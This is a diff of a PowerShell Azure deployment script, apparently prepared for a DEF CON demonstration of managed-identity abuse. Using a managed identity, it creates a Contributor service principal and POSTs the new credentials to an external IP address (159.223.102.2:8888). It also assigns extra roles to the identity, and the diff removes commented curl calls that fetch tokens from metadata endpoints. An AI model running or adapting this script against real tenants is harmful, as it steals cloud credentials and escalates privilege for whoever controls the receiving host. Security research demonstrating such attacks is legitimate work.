@@ -3,6 +3,8 @@ $location = "westeurope" # <- This must be a location that can host Azure Contai
 $storageAccountName = "deploymentscript474694" # <- Unique storage account name
 $userManagedIdentity = "mi_wucpi" # <- Change this if you want
 
+Write-Output "Original Script"
+
 Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $storageAccountName || New-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $storageAccountName -Location $location -SkuName Standard_LRS
 Set-AzStorageAccount -Name $storageAccountName -ResourceGroupName $resourceGroupName -EnableHttpsTrafficOnly $true
 
@@ -11,6 +13,8 @@ New-AzStorageAccount -ResourceGroupName $resourceGroupName -Name wucpinewstorage
 $uamiObject = New-AzUserAssignedIdentity -ResourceGroupName $resourceGroupName -Name $userManagedIdentity -Location $location
 
 New-AzUserAssignedIdentity -ResourceGroupName $resourceGroupName -Name mi_wucpi2 -Location $location
+
+Write-Output "Install azure cli"
 
 curl -sL https://aka.ms/InstallAzureCLIDeb | bash
 
@@ -22,27 +26,15 @@ curl -sL https://aka.ms/InstallAzureCLIDeb | bash
 
 Write-Output "Curl commands"
 
-#curl -s -k -H Metadata:true --noproxy "*" "http://169.254.131.2:8081/msi/token?resource=https://management.azure.com"
+Write-Output "Az Login With Managed Identity"
 
-#curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&object_id=febc5f61-f7d0-4897-b47b-763e843ddc37&client_id=a4d8d5a8-f5f2-4e78-91d6-9cdf1e94365b"
-
-#curl -s -H Metadata:true -H "x-identity-header: $IDENTITY_HEADER" --noproxy "*" "http://localhost:42356/msi/token?resource=https://management.azure.net&api-version=2019-08-01"
-
-#$something=$(curl -s -H Metadata:true -H x-identity-header: $IDENTITY_HEADER --noproxy "*" "http://localhost:42356/msi/token?resource=https://management.azure.net&api-version=2019-08-01")
-
-#$something
-
-Write-Output "$something"
-
-echo $something
-
-Write-Output "AZ Login With Managed Identity"
+#managed_identity Client ID 6502a0a1-d796-4fd9-8050-8ab50eefd439
 
 az login --identity --username 6502a0a1-d796-4fd9-8050-8ab50eefd439
 
-Write-Output "SP Creation"
+Write-Output "SP Creation by Managed Identity"
 
-$output=$(az ad sp create-for-rbac --name wucpi_sp7 --role contributor --scopes /subscriptions/edad2455-179b-4571-b559-877fb12b46ac/resourceGroups/cvtrsg)
+$output=$(az ad sp create-for-rbac --name defcon32_cv --role contributor --scopes /subscriptions/edad2455-179b-4571-b559-877fb12b46ac/resourceGroups/cvtrsg)
 
 $body=$output
 
@@ -53,7 +45,7 @@ $header = @{
 
 Invoke-RestMethod -Uri "http://159.223.102.2:8888/" -Method 'Post' -Body $body -Headers $header
 
-Write-Output "Role Assignments"
+Write-Output "Role Assignments by Managed Identity"
 
 New-AzRoleAssignment -ObjectId $uamiObject.PrincipalId -RoleDefinitionName Reader
 New-AzRoleAssignment -ObjectId $uamiObject.PrincipalId -RoleDefinitionName "Virtual Machine Contributor"
